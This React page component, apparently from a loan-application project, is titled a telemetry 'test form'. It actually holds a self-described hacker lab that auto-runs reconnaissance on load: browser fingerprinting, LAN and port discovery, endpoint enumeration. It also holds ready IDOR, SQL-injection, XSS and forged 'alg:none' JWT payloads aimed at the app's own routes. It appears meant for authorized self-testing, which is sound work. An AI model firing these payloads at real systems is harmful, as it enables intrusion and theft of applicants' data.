/**
 * 🎯 FORMULAIRE DE TEST - Test de Demande de Prêt
 * Page de test pour valider le système de télémétrie
 */

'use client'

import { useState, useEffect, useRef } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Terminal,
  Shield,
  Wifi,
  Server,
  Globe,
  Eye,
  Zap,
  Database,
  Lock,
  Unlock,
  Target,
  Activity,
  Network,
  Cpu,
  HardDrive,
  Radio,
} from 'lucide-react'

interface Identity {
  type: string
  value: string
  source: string
  sensitive: boolean
}

interface NetworkDevice {
  hostname: string
  ip: string
  mac: string
  type: string
}

interface ScanResult {
  local_machine?: {
    ip: string
    mac: string
    hostname: string
  }
  network_devices?: NetworkDevice[]
  open_ports?: any[]
  network_info?: any
}

interface TestResult {
  id: string
  technique: string
  target: string
  status: 'running' | 'success' | 'blocked' | 'error'
  details: string
  timestamp: string
  data?: any
}

export default function HackerLabPro() {
  const [identities, setIdentities] = useState<Identity[]>([])
  const [scanResult, setScanResult] = useState<ScanResult | null>(null)
  const [results, setResults] = useState<TestResult[]>([])
  const [isScanning, setIsScanning] = useState(false)
  const [activeTab, setActiveTab] = useState<'recon' | 'exploit'>('recon')
  const terminalRef = useRef<HTMLDivElement>(null)

  // Auto-scroll
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight
    }
  }, [results, identities])

  // Matrix effect
  useEffect(() => {
    const canvas = document.getElementById('matrix') as HTMLCanvasElement
    if (!canvas) return
    const ctx = canvas.getContext('2d')
    if (!ctx) return

    canvas.width = window.innerWidth
    canvas.height = window.innerHeight

    const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホ'
    const fontSize = 14
    const columns = canvas.width / fontSize
    const drops: number[] = []

    for (let i = 0; i < columns; i++) drops[i] = Math.random() * -100

    function draw() {
      if (!ctx || !canvas) return
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'
      ctx.fillRect(0, 0, canvas.width, canvas.height)
      ctx.fillStyle = '#0F0'
      ctx.font = `${fontSize}px monospace`

      for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)]
        ctx.fillText(text, i * fontSize, drops[i] * fontSize)
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0
        drops[i]++
      }
    }

    const interval = setInterval(draw, 33)
    return () => clearInterval(interval)
  }, [])

  // Auto-scan on mount
  useEffect(() => {
    runReconnaissance()
  }, [])

  const addIdentity = (type: string, value: string, source: string, sensitive = false) => {
    setIdentities((prev) => [
      ...prev,
      { type, value, source, sensitive },
    ])
  }

  const addResult = (result: Omit<TestResult, 'id' | 'timestamp'>) => {
    setResults((prev) => [
      ...prev,
      {
        ...result,
        id: Math.random().toString(36).substr(2, 9),
        timestamp: new Date().toISOString(),
      },
    ])
  }

  const runReconnaissance = async () => {
    setIsScanning(true)
    setIdentities([])
    addResult({
      technique: 'RECON',
      target: 'System',
      status: 'running',
      details: '🔍 Starting full reconnaissance scan...',
    })

    // 1. Browser fingerprinting
    await scanBrowserIdentity()

    // 2. Network scan
    await scanNetwork()

    // 3. API endpoints
    await scanEndpoints()

    // 4. Headers
    await scanHeaders()

    setIsScanning(false)
    addResult({
      technique: 'RECON',
      target: 'System',
      status: 'success',
      details: `✅ Reconnaissance complete - ${identities.length} identities discovered`,
    })
  }

  const scanBrowserIdentity = async () => {
    addResult({
      technique: 'FINGERPRINT',
      target: 'Browser',
      status: 'running',
      details: 'Extracting browser identities...',
    })

    await new Promise((resolve) => setTimeout(resolve, 500))

    // User Agent
    addIdentity('User-Agent', navigator.userAgent, 'navigator.userAgent')

    // Platform
    addIdentity('Platform', navigator.platform, 'navigator.platform')

    // Language
    addIdentity('Language', navigator.language, 'navigator.language')

    // Screen
    addIdentity(
      'Screen Resolution',
      `${window.screen.width}x${window.screen.height}`,
      'window.screen'
    )

    // Timezone
    addIdentity('Timezone', Intl.DateTimeFormat().resolvedOptions().timeZone, 'Intl')

    // Hardware
    addIdentity('CPU Cores', navigator.hardwareConcurrency?.toString() || 'unknown', 'navigator')

    // Memory
    const memory = (navigator as any).deviceMemory
    if (memory) addIdentity('Device Memory', `${memory} GB`, 'navigator.deviceMemory')

    // Connection
    const connection = (navigator as any).connection
    if (connection) {
      addIdentity('Connection Type', connection.effectiveType, 'navigator.connection')
      addIdentity('Downlink', `${connection.downlink} Mbps`, 'navigator.connection')
    }

    // Cookies enabled
    addIdentity('Cookies Enabled', navigator.cookieEnabled.toString(), 'navigator.cookieEnabled')

    // Do Not Track
    addIdentity('DNT', (navigator as any).doNotTrack || 'unset', 'navigator.doNotTrack')

    addResult({
      technique: 'FINGERPRINT',
      target: 'Browser',
      status: 'success',
      details: '✅ Browser fingerprinted',
    })
  }

  const scanNetwork = async () => {
    addResult({
      technique: 'NETWORK',
      target: '/api/osint/lab-scan',
      status: 'running',
      details: 'Scanning network topology...',
    })

    await new Promise((resolve) => setTimeout(resolve, 800))

    try {
      const res = await fetch('/api/osint/lab-scan')
      const data = await res.json()

      if (res.status === 200 && data.success) {
        setScanResult(data.data)

        // Extract identities
        if (data.data.local_machine) {
          addIdentity('Local IP', data.data.local_machine.ip, 'ifconfig', true)
          addIdentity('MAC Address', data.data.local_machine.mac, 'ifconfig', true)
          addIdentity('Hostname', data.data.local_machine.hostname, 'hostname', true)
        }

        if (data.data.network_devices) {
          data.data.network_devices.forEach((device: NetworkDevice) => {
            addIdentity(`Device: ${device.hostname}`, `${device.ip} (${device.mac})`, 'arp -a', true)
          })
        }

        if (data.data.network_info) {
          if (data.data.network_info.gateway) {
            addIdentity('Gateway', data.data.network_info.gateway, 'netstat -rn', true)
          }
          if (data.data.network_info.dns_servers) {
            data.data.network_info.dns_servers.forEach((dns: string, i: number) => {
              addIdentity(`DNS ${i + 1}`, dns, '/etc/resolv.conf', true)
            })
          }
        }

        if (data.data.open_ports) {
          data.data.open_ports.forEach((port: any) => {
            addIdentity(
              `Port ${port.port}`,
              `${port.service} (${port.public ? 'PUBLIC' : 'LOCAL'})`,
              'netstat -an',
              port.public
            )
          })
        }

        addResult({
          technique: 'NETWORK',
          target: '/api/osint/lab-scan',
          status: 'success',
          details: `✅ Network scanned - ${data.data.network_devices?.length || 0} devices found`,
        })
      } else if (res.status === 401) {
        addResult({
          technique: 'NETWORK',
          target: '/api/osint/lab-scan',
          status: 'blocked',
          details: '🔒 PROTECTED - Authentication required',
        })
      }
    } catch (error: any) {
      addResult({
        technique: 'NETWORK',
        target: '/api/osint/lab-scan',
        status: 'error',
        details: `❌ Error: ${error.message}`,
      })
    }
  }

  const scanEndpoints = async () => {
    addResult({
      technique: 'ENDPOINTS',
      target: 'API Routes',
      status: 'running',
      details: 'Enumerating API endpoints...',
    })

    await new Promise((resolve) => setTimeout(resolve, 500))

    const endpoints = [
      '/api/applications',
      '/api/applications/submit',
      '/api/osint/lab-scan',
      '/api/osint/network-scan',
      '/api/sentinel/execute',
      '/api/sentinel/fleet',
      '/api/admin/metrics',
      '/api/auth/login',
    ]

    for (const endpoint of endpoints) {
      try {
        const res = await fetch(endpoint)
        const status = res.status
        const accessible = status !== 404

        if (accessible) {
          addIdentity(
            'Endpoint',
            `${endpoint} [${status}]`,
            'Directory enumeration',
            status === 200
          )
        }
      } catch (error) {
        // Ignore
      }
    }

    addResult({
      technique: 'ENDPOINTS',
      target: 'API Routes',
      status: 'success',
      details: '✅ Endpoints enumerated',
    })
  }

  const scanHeaders = async () => {
    addResult({
      technique: 'HEADERS',
      target: 'HTTP',
      status: 'running',
      details: 'Analyzing HTTP headers...',
    })

    await new Promise((resolve) => setTimeout(resolve, 500))

    try {
      const res = await fetch('/')
      const headers = res.headers

      headers.forEach((value, key) => {
        addIdentity(`Header: ${key}`, value, 'HTTP Response')
      })

      addResult({
        technique: 'HEADERS',
        target: 'HTTP',
        status: 'success',
        details: '✅ Headers captured',
      })
    } catch (error) {
      // Ignore
    }
  }

  // Exploitation functions
  const runIDOR = async () => {
    addResult({
      technique: 'IDOR',
      target: '/api/applications/*',
      status: 'running',
      details: 'Testing IDOR vulnerability...',
    })

    const refs = ['SAR-LP-000001', 'SAR-LP-000002', 'SAR-LP-000003']
    for (const ref of refs) {
      await new Promise((resolve) => setTimeout(resolve, 800))
      try {
        const res = await fetch(`/api/applications/${ref}`)
        if (res.status === 200) {
          addResult({
            technique: 'IDOR',
            target: `/api/applications/${ref}`,
            status: 'success',
            details: `🚨 VULNERABLE - ${ref} accessible without auth`,
          })
        } else {
          addResult({
            technique: 'IDOR',
            target: `/api/applications/${ref}`,
            status: 'blocked',
            details: `✅ Protected (${res.status})`,
          })
        }
      } catch (error) {
        // Ignore
      }
    }
  }

  const runSQLi = async () => {
    addResult({
      technique: 'SQLi',
      target: '/api/auth/login',
      status: 'running',
      details: 'Testing SQL injection...',
    })

    const payloads = [
      "admin' OR '1'='1' --",
      "admin' UNION SELECT * FROM users--",
    ]

    for (const payload of payloads) {
      await new Promise((resolve) => setTimeout(resolve, 1000))
      try {
        const res = await fetch('/api/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: payload, password: 'x' }),
        })

        if (res.status === 200) {
          addResult({
            technique: 'SQLi',
            target: '/api/auth/login',
            status: 'success',
            details: `🚨 VULNERABLE - SQLi successful`,
          })
        } else {
          addResult({
            technique: 'SQLi',
            target: '/api/auth/login',
            status: 'blocked',
            details: `✅ Protected (${res.status})`,
          })
        }
      } catch (error) {
        addResult({
          technique: 'SQLi',
          target: '/api/auth/login',
          status: 'blocked',
          details: '✅ Route not implemented',
        })
        break
      }
    }
  }

  const runXSS = async () => {
    addResult({
      technique: 'XSS',
      target: 'Form inputs',
      status: 'running',
      details: 'Testing XSS vectors...',
    })

    await new Promise((resolve) => setTimeout(resolve, 1000))

    const payloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
    ]

    for (const payload of payloads) {
      try {
        const res = await fetch('/api/applications/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            origin: 'argentrapide',
            prenom: payload,
            nom: 'Test',
            courriel: 'test@test.com',
            telephone: '5141234567',
            montant_demande: 100000,
          }),
        })

        const data = await res.json()
        if (res.status === 200 && !data.errors) {
          addResult({
            technique: 'XSS',
            target: 'prenom field',
            status: 'success',
            details: '🚨 VULNERABLE - XSS payload accepted',
          })
        } else {
          addResult({
            technique: 'XSS',
            target: 'prenom field',
            status: 'blocked',
            details: '✅ Protected - Payload sanitized',
          })
        }
      } catch (error) {
        // Ignore
      }
    }
  }

  const runJWT = async () => {
    addResult({
      technique: 'JWT',
      target: '/api/admin/*',
      status: 'running',
      details: 'Testing JWT bypass...',
    })

    await new Promise((resolve) => setTimeout(resolve, 1000))

    const fakeToken =
      btoa(JSON.stringify({ alg: 'none', typ: 'JWT' })) +
      '.' +
      btoa(JSON.stringify({ sub: 'admin', role: 'admin' })) +
      '.'

    try {
      const res = await fetch('/api/admin/metrics/inspect', {
        headers: { Authorization: `Bearer ${fakeToken}` },
      })

      if (res.status === 200) {
        addResult({
          technique: 'JWT',
          target: '/api/admin/metrics',
          status: 'success',
          details: '🚨 VULNERABLE - JWT bypass successful',
        })
      } else {
        addResult({
          technique: 'JWT',
          target: '/api/admin/metrics',
          status: 'blocked',
          details: `✅ Protected (${res.status})`,
        })
      }
    } catch (error) {
      addResult({
        technique: 'JWT',
        target: '/api/admin/metrics',
        status: 'blocked',
        details: '✅ Protected',
      })
    }
  }

  const runAllExploits = async () => {
    await runIDOR()
    await runSQLi()
    await runXSS()
    await runJWT()
  }

  const stats = {
    identities: identities.length,
    sensitive: identities.filter((i) => i.sensitive).length,
    devices: scanResult?.network_devices?.length || 0,
    ports: scanResult?.open_ports?.length || 0,
    vulnerable: results.filter((r) => r.status === 'success').length,
  }

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono relative overflow-hidden">
      <canvas id="matrix" className="fixed inset-0 opacity-20 pointer-events-none" />

      <div className="relative z-10 p-6">
        {/* Header */}
        <motion.div
          className="mb-6 text-center"
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
        >
          <div className="flex items-center justify-center gap-3 mb-2">
            <Shield className="w-10 h-10 text-blue-500" />
            <h1 className="text-4xl font-bold">
              <span className="text-blue-500">FORMULAIRE</span>
              <span className="text-green-400"> DE</span>
              <span className="text-cyan-400"> TEST</span>
            </h1>
            <Terminal className="w-10 h-10 text-cyan-400" />
          </div>
          <div className="text-xs text-yellow-400/60">
            [ Test de Demande de Prêt - Système de Télémétrie ]
          </div>
        </motion.div>

        {/* Stats Bar */}
        <div className="grid grid-cols-5 gap-3 mb-6">
          <div className="bg-gray-900/50 border border-cyan-500/30 rounded p-3">
            <div className="text-xs text-cyan-400/60">IDENTITIES</div>
            <div className="text-2xl font-bold text-cyan-400">{stats.identities}</div>
          </div>
          <div className="bg-gray-900/50 border border-red-500/30 rounded p-3">
            <div className="text-xs text-red-400/60">SENSITIVE</div>
            <div className="text-2xl font-bold text-red-400">{stats.sensitive}</div>
          </div>
          <div className="bg-gray-900/50 border border-purple-500/30 rounded p-3">
            <div className="text-xs text-purple-400/60">DEVICES</div>
            <div className="text-2xl font-bold text-purple-400">{stats.devices}</div>
          </div>
          <div className="bg-gray-900/50 border border-yellow-500/30 rounded p-3">
            <div className="text-xs text-yellow-400/60">OPEN PORTS</div>
            <div className="text-2xl font-bold text-yellow-400">{stats.ports}</div>
          </div>
          <div className="bg-gray-900/50 border border-orange-500/30 rounded p-3">
            <div className="text-xs text-orange-400/60">VULNERABLE</div>
            <div className="text-2xl font-bold text-orange-400">{stats.vulnerable}</div>
          </div>
        </div>

        {/* Tabs */}
        <div className="flex gap-2 mb-6">
          <button
            onClick={() => setActiveTab('recon')}
            className={`flex-1 py-3 rounded-lg font-bold transition-all flex items-center justify-center gap-2 ${
              activeTab === 'recon'
                ? 'bg-cyan-600 text-white'
                : 'bg-gray-900/50 text-gray-400 hover:bg-gray-800'
            }`}
          >
            <Eye className="w-5 h-5" />
            RECONNAISSANCE
          </button>
          <button
            onClick={() => setActiveTab('exploit')}
            className={`flex-1 py-3 rounded-lg font-bold transition-all flex items-center justify-center gap-2 ${
              activeTab === 'exploit'
                ? 'bg-red-600 text-white'
                : 'bg-gray-900/50 text-gray-400 hover:bg-gray-800'
            }`}
          >
            <Zap className="w-5 h-5" />
            EXPLOITATION
          </button>
        </div>

        <div className="grid grid-cols-2 gap-6">
          {/* Left Panel - Identities / Exploits */}
          <div className="space-y-4">
            {activeTab === 'recon' && (
              <>
                <button
                  onClick={runReconnaissance}
                  disabled={isScanning}
                  className="w-full py-3 bg-cyan-600 hover:bg-cyan-700 disabled:bg-gray-700
                    text-white font-bold rounded-lg transition-all flex items-center justify-center gap-2"
                >
                  <Activity className="w-5 h-5" />
                  {isScanning ? 'SCANNING...' : 'RUN FULL RECON'}
                </button>

                <div className="bg-gray-900/50 border border-cyan-500/30 rounded-lg p-4 h-[600px] overflow-y-auto">
                  <h3 className="text-cyan-400 font-bold mb-4 flex items-center gap-2">
                    <Database className="w-5 h-5" />
                    DISCOVERED IDENTITIES ({identities.length})
                  </h3>

                  {identities.length === 0 ? (
                    <div className="text-gray-500 text-center py-8">
                      <Eye className="w-12 h-12 mx-auto mb-4 opacity-30" />
                      Click "RUN FULL RECON" to start scanning
                    </div>
                  ) : (
                    <div className="space-y-2">
                      {identities.map((identity, index) => (
                        <motion.div
                          key={index}
                          initial={{ opacity: 0, x: -20 }}
                          animate={{ opacity: 1, x: 0 }}
                          transition={{ delay: index * 0.02 }}
                          className={`p-3 rounded border ${
                            identity.sensitive
                              ? 'bg-red-900/20 border-red-500/30'
                              : 'bg-gray-800/50 border-gray-700/30'
                          }`}
                        >
                          <div className="flex items-start justify-between gap-2">
                            <div className="flex-1 min-w-0">
                              <div className="text-xs text-gray-400 mb-1">{identity.source}</div>
                              <div className="font-bold text-green-400 text-sm break-all">
                                {identity.type}
                              </div>
                              <div className="text-cyan-400 text-xs mt-1 break-all">
                                {identity.value}
                              </div>
                            </div>
                            {identity.sensitive && (
                              <Lock className="w-4 h-4 text-red-400 flex-shrink-0" />
                            )}
                          </div>
                        </motion.div>
                      ))}
                    </div>
                  )}
                </div>
              </>
            )}

            {activeTab === 'exploit' && (
              <>
                <div className="grid grid-cols-2 gap-3">
                  <button
                    onClick={runIDOR}
                    disabled={isScanning}
                    className="py-3 bg-red-900/30 hover:bg-red-900/50 border border-red-500/30
                      text-white font-bold rounded-lg transition-all"
                  >
                    IDOR
                  </button>
                  <button
                    onClick={runSQLi}
                    disabled={isScanning}
                    className="py-3 bg-purple-900/30 hover:bg-purple-900/50 border border-purple-500/30
                      text-white font-bold rounded-lg transition-all"
                  >
                    SQLi
                  </button>
                  <button
                    onClick={runXSS}
                    disabled={isScanning}
                    className="py-3 bg-orange-900/30 hover:bg-orange-900/50 border border-orange-500/30
                      text-white font-bold rounded-lg transition-all"
                  >
                    XSS
                  </button>
                  <button
                    onClick={runJWT}
                    disabled={isScanning}
                    className="py-3 bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-500/30
                      text-white font-bold rounded-lg transition-all"
                  >
                    JWT
                  </button>
                </div>

                <button
                  onClick={runAllExploits}
                  disabled={isScanning}
                  className="w-full py-3 bg-red-600 hover:bg-red-700 disabled:bg-gray-700
                    text-white font-bold rounded-lg transition-all flex items-center justify-center gap-2"
                >
                  <Zap className="w-5 h-5" />
                  RUN ALL EXPLOITS
                </button>

                <div className="bg-gray-900/50 border border-red-500/30 rounded-lg p-4">
                  <h3 className="text-red-400 font-bold mb-4">EXPLOIT RESULTS</h3>
                  <div className="space-y-2">
                    {results
                      .filter((r) => r.technique !== 'RECON' && r.technique !== 'FINGERPRINT' && r.technique !== 'NETWORK' && r.technique !== 'ENDPOINTS' && r.technique !== 'HEADERS')
                      .map((result) => (
                        <div
                          key={result.id}
                          className={`p-2 rounded border text-xs ${
                            result.status === 'success'
                              ? 'bg-red-900/20 border-red-500/30'
                              : result.status === 'blocked'
                                ? 'bg-cyan-900/20 border-cyan-500/30'
                                : 'bg-gray-800/50 border-gray-700/30'
                          }`}
                        >
                          <div className="font-bold">[{result.technique}] {result.target}</div>
                          <div className="text-gray-400 mt-1">{result.details}</div>
                        </div>
                      ))}
                  </div>
                </div>
              </>
            )}
          </div>

          {/* Right Panel - Terminal */}
          <div className="bg-black border-2 border-green-500/30 rounded-lg overflow-hidden">
            <div className="bg-gray-900/80 px-4 py-2 flex items-center justify-between border-b border-green-500/30">
              <div className="flex items-center gap-2">
                <div className="w-3 h-3 rounded-full bg-red-500" />
                <div className="w-3 h-3 rounded-full bg-yellow-500" />
                <div className="w-3 h-3 rounded-full bg-green-500" />
                <span className="ml-4 text-green-400 text-sm">root@hacker-lab-pro:~$</span>
              </div>
              <div className="text-xs text-green-400/60">
                {isScanning ? '[ ACTIVE ]' : '[ READY ]'}
              </div>
            </div>

            <div
              ref={terminalRef}
              className="p-4 h-[650px] overflow-y-auto scrollbar-thin scrollbar-thumb-green-500/50"
            >
              <AnimatePresence>
                {results.map((result, index) => (
                  <motion.div
                    key={result.id}
                    initial={{ opacity: 0, x: -20 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ delay: index * 0.03 }}
                    className="mb-3"
                  >
                    <div className="text-xs text-gray-500">
                      [{new Date(result.timestamp).toLocaleTimeString()}]
                    </div>
                    <div className="font-bold text-green-400">
                      [{result.technique}] {result.target}
                    </div>
                    <div
                      className={`text-sm mt-1 ${
                        result.status === 'success'
                          ? 'text-red-400'
                          : result.status === 'blocked'
                            ? 'text-cyan-400'
                            : result.status === 'running'
                              ? 'text-yellow-400'
                              : 'text-gray-400'
                      }`}
                    >
                      {result.details}
                    </div>
                  </motion.div>
                ))}
              </AnimatePresence>

              {results.length === 0 && (
                <div className="text-green-400/50 text-center py-8">
                  <Terminal className="w-12 h-12 mx-auto mb-4 opacity-30" />
                  <div>Waiting for commands...</div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-6 text-center text-xs text-yellow-400/40">
          ⚠️ AUTHORIZED TESTING ONLY • R&D MODE • SAR SECURITY LAB PRO
        </div>
      </div>
    </div>
  )
}
